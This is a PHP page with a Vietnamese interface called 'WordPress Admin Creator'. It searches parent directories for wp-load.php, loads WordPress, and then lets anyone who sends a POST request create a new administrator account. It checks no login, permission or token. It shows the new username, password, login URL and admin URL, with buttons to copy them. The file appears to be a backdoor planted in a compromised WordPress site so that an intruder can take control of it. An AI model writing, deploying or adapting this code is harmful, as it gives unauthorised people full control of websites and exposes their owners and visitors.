<?php
$wp_loaded = false;
$wp_path = __DIR__;
for ($i = 0; $i < 10; $i++) {
    if (file_exists($wp_path . '/wp-load.php')) {
        require_once($wp_path . '/wp-load.php');
        $wp_loaded = true;
        break;
    }
    $wp_path = dirname($wp_path);
}

if (!$wp_loaded) {
    die("❌ Không tìm thấy WordPress.");
}

$result = '';
$admin_info = '';
$copy_text = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $mode = $_POST['mode'] ?? 'random';
    
    if ($mode === 'random') {
        $username = 'admin_' . substr(md5(uniqid()), 0, 6);
        $password = substr(md5(uniqid()), 0, 10);
        $email = $username . '@' . parse_url(get_site_url(), PHP_URL_HOST);
    } else {
        $username = sanitize_user($_POST['username'] ?? '');
        $password = $_POST['password'] ?? '';
        $email = sanitize_email($_POST['email'] ?? '');
        
        if (empty($username) || empty($password)) {
            $result = '<div class="error">❌ Vui lòng nhập username và password!</div>';
        }
    }
    
    if (empty($result)) {
        if (username_exists($username)) {
            $result = '<div class="error">❌ Username đã tồn tại!</div>';
        } else {
            if (empty($email)) {
                $email = $username . '@' . parse_url(get_site_url(), PHP_URL_HOST);
            }
            
            $user_id = wp_create_user($username, $password, $email);
            
            if (is_wp_error($user_id)) {
                $result = '<div class="error">❌ Lỗi: ' . $user_id->get_error_message() . '</div>';
            } else {
                $user = new WP_User($user_id);
                $user->set_role('administrator');
                
                $site_url = get_site_url();
                $login_url = wp_login_url();
                $admin_url = admin_url();
                
                $admin_info = '
                <div class="success-box">
                    <h3>✅ Tạo Admin Thành Công!</h3>
                    <div class="info-grid">
                        <div class="info-item">
                            <span class="label">🌐 Website:</span>
                            <span class="value">' . $site_url . '</span>
                        </div>
                        <div class="info-item">
                            <span class="label">👤 Username:</span>
                            <span class="value" id="copy-username">' . $username . '</span>
                        </div>
                        <div class="info-item">
                            <span class="label">🔑 Password:</span>
                            <span class="value" id="copy-password">' . $password . '</span>
                        </div>
                        <div class="info-item">
                            <span class="label">📧 Email:</span>
                            <span class="value">' . $email . '</span>
                        </div>
                        <div class="info-item">
                            <span class="label">🔗 Login URL:</span>
                            <span class="value">' . $login_url . '</span>
                        </div>
                        <div class="info-item">
                            <span class="label">⚡ Admin URL:</span>
                            <span class="value">' . $admin_url . '</span>
                        </div>
                    </div>
                </div>';
                
                $copy_text = "🌐 Website: $site_url\n👤 Username: $username\n🔑 Password: $password\n📧 Email: $email\n🔗 Login: $login_url\n⚡ Admin: $admin_url";
                
                $result = $admin_info;
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WordPress Admin Creator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        .container { background: white; border-radius: 15px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 800px; overflow: hidden; }
        .header { background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%); color: white; padding: 30px; text-align: center; }
        .header h1 { font-size: 28px; margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .header p { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .mode-selector { display: flex; gap: 10px; margin-bottom: 30px; background: #f8fafc; padding: 5px; border-radius: 10px; }
        .mode-btn { flex: 1; padding: 12px; border: none; background: none; border-radius: 8px; cursor: pointer; font-weight: 600; transition: all 0.3s; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .mode-btn.active { background: white; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #374151; display: flex; align-items: center; gap: 8px; }
        .form-input { width: 100%; padding: 12px 15px; border: 2px solid #e5e7eb; border-radius: 8px; font-size: 16px; transition: border-color 0.3s; }
        .form-input:focus { outline: none; border-color: #4f46e5; }
        .random-hint { background: #f0f9ff; border: 1px dashed #0ea5e9; border-radius: 8px; padding: 15px; margin-top: 10px; font-size: 14px; color: #0369a1; }
        .btn { background: linear-gradient(135deg, #10b981 0%, #059669 100%); color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; width: 100%; display: flex; align-items: center; justify-content: center; gap: 10px; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(16, 185, 129, 0.4); }
        .success-box { background: #f0fdf4; border: 2px solid #86efac; border-radius: 10px; padding: 25px; margin-top: 30px; }
        .success-box h3 { color: #065f46; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 15px; }
        .info-item { padding: 12px; background: white; border-radius: 8px; border: 1px solid #dcfce7; }
        .label { font-weight: 600; color: #374151; display: block; margin-bottom: 5px; display: flex; align-items: center; gap: 8px; }
        .value { color: #1f2937; word-break: break-all; font-family: 'Courier New', monospace; font-size: 14px; padding: 5px; background: #f9fafb; border-radius: 4px; display: block; margin-top: 5px; }
        .copy-buttons { display: flex; gap: 10px; margin-top: 25px; flex-wrap: wrap; }
        .copy-btn { flex: 1; min-width: 200px; padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.3s; }
        .copy-all { background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%); color: white; }
        .copy-url { background: #f3f4f6; color: #374151; }
        .copy-cred { background: #fef3c7; color: #92400e; }
        .copy-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
        .error { background: #fef2f2; border: 2px solid #fecaca; color: #dc2626; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; gap: 10px; }
        .footer { text-align: center; padding: 20px; color: #6b7280; font-size: 14px; border-top: 1px solid #e5e7eb; margin-top: 30px; }
        @media (max-width: 768px) {
            .container { margin: 10px; }
            .header, .content { padding: 20px; }
            .copy-btn { min-width: 100%; }
            .info-grid { grid-template-columns: 1fr; }
        }
        .hidden { display: none; }
        #copy-textarea { position: absolute; left: -9999px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ WordPress Admin Creator</h1>
            
        </div>
        
        <div class="content">
            <form method="POST" id="admin-form">
                <div class="mode-selector">
                    <button type="button" class="mode-btn active" data-mode="random">
                        <span>🎲</span> Random Auto
                    </button>
                    <button type="button" class="mode-btn" data-mode="custom">
                        <span>✏️</span> Custom
                    </button>
                </div>
                
                <input type="hidden" name="mode" id="mode-input" value="random">
                
                <div id="random-mode">
                    <div class="random-hint">
                        <strong>📝 Random sẽ tạo:</strong><br>
                        • Username: admin_xxxxxx (6 ký tự)<br>
                        • Password: xxxxxxxxxx (10 ký tự)<br>
                        • Email: username@domain.com
                    </div>
                </div>
                
                <div id="custom-mode" class="hidden">
                    <div class="form-group">
                        <label for="username">👤 Username</label>
                        <input type="text" id="username" name="username" class="form-input" placeholder="Nhập username">
                    </div>
                    
                    <div class="form-group">
                        <label for="password">🔑 Password</label>
                        <input type="text" id="password" name="password" class="form-input" placeholder="Nhập password">
                    </div>
                    
                    <div class="form-group">
                        <label for="email">📧 Email (optional)</label>
                        <input type="email" id="email" name="email" class="form-input" placeholder="email@domain.com">
                    </div>
                </div>
                
                <button type="submit" class="btn">
                    <span>⚡</span> Tạo Admin Ngay
                </button>
            </form>
            
            <?php echo $result; ?>
            
            <?php if (!empty($copy_text)): ?>
            <div class="copy-buttons">
                <button type="button" class="copy-btn copy-all" onclick="copyToClipboard('all')">
                    <span>📋</span> Copy All Info
                </button>
                <button type="button" class="copy-btn copy-url" onclick="copyToClipboard('url')">
                    <span>🌐</span> Copy Website URL
                </button>
                <button type="button" class="copy-btn copy-cred" onclick="copyToClipboard('cred')">
                    <span>👤</span> Copy Username & Password
                </button>
            </div>
            <?php endif; ?>
            
            <div class="footer">
            </div>
        </div>
    </div>
    
    <textarea id="copy-textarea"></textarea>
    
    <script>
        const modeButtons = document.querySelectorAll('.mode-btn');
        const modeInput = document.getElementById('mode-input');
        const randomMode = document.getElementById('random-mode');
        const customMode = document.getElementById('custom-mode');
        const copyText = <?php echo json_encode($copy_text ?? ''); ?>;
        
        modeButtons.forEach(button => {
            button.addEventListener('click', function() {
                const mode = this.dataset.mode;
                modeButtons.forEach(btn => btn.classList.remove('active'));
                this.classList.add('active');
                modeInput.value = mode;
                
                if (mode === 'random') {
                    randomMode.classList.remove('hidden');
                    customMode.classList.add('hidden');
                } else {
                    randomMode.classList.add('hidden');
                    customMode.classList.remove('hidden');
                }
            });
        });
        
        function copyToClipboard(type) {
            const textarea = document.getElementById('copy-textarea');
            let text = '';
            
            switch(type) {
                case 'all':
                    text = copyText;
                    break;
                case 'url':
                    text = '<?php echo get_site_url(); ?>';
                    break;
                case 'cred':
                    const username = document.getElementById('copy-username')?.textContent || '';
                    const password = document.getElementById('copy-password')?.textContent || '';
                    text = `Username: ${username}\nPassword: ${password}`;
                    break;
            }
            
            textarea.value = text;
            textarea.select();
            textarea.setSelectionRange(0, 99999);
            
            try {
                const successful = document.execCommand('copy');
                const msg = successful ? '✅ Đã copy!' : '❌ Copy thất bại';
                alert(msg);
            } catch (err) {
                alert('❌ Lỗi khi copy: ' + err);
            }
            
            textarea.value = '';
        }
        
        document.getElementById('username')?.focus();
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
    </script>
</body>
</html>
